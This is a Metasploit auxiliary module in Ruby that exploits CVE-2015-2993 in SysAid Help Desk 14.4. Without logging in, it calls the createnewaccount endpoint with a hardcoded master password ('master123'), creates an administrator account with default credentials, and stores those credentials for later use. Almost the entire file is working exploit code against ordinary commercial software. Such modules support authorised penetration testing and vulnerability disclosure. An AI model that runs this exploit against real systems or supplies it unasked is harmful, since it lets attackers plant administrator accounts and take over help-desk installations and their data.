##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'SysAid Help Desk Administrator Account Creation',
      'Description' => %q{
        This module exploits a vulnerability in SysAid Help Desk that allows an
        unauthenticated user to create an administrator account. Note that this
        exploit will only work once! Any subsequent attempts will fail.
        This module has been tested on SysAid 14.4 in Windows and Linux.
        },
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'CVE', 'CVE-2015-2993' ],
          [ 'OSVDB', 'TODO' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/generic/sysaid-14.4-multiple-vulns.txt' ],
          [ 'URL', 'TODO_FULLDISC_URL' ]
        ],
      'DisclosureDate' => 'Jun 3 2015'))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 8080]),
        OptString.new('TARGETURI', [ true,  "SysAid path", '/sysaid']),
        OptString.new('USERNAME', [true, 'The username for the new admin account', 'msf']),
        OptString.new('PASSWORD', [true, 'The password for the new admin account', 'password'])
      ], self.class)
  end


  def run
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'createnewaccount'),
      'method' =>'GET',
      'vars_get' => {
        'accountID' => Rex::Text.rand_text_numeric(4),
        'organizationName' => Rex::Text.rand_text_alpha(rand(4) + rand(8)),
        'userName' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'masterPassword' => 'master123'
      }
    })
    if res && res.code == 200 && res.body.to_s =~ /Error while creating account/
      # No way to know whether this worked or not, it always says error
      print_good("#{peer} - Created administrator account with credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
      service_data = {
        address: rhost,
        port: rport,
        service_name: (ssl ? 'https' : 'http'),
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }
      credential_data = {
        origin_type: :service,
        module_fullname: self.fullname,
        private_type: :password,
        private_data: datastore['PASSWORD'],
        username: datastore['USERNAME']
      }

      credential_data.merge!(service_data)
      credential_core = create_credential(credential_data)
      login_data = {
        core: credential_core,
        access_level: 'Administrator',
        status: Metasploit::Model::Login::Status::UNTRIED
      }
      login_data.merge!(service_data)
      create_credential_login(login_data)
    else
      print_error("#{peer} - Administrator account creation failed")
    end
  end
end
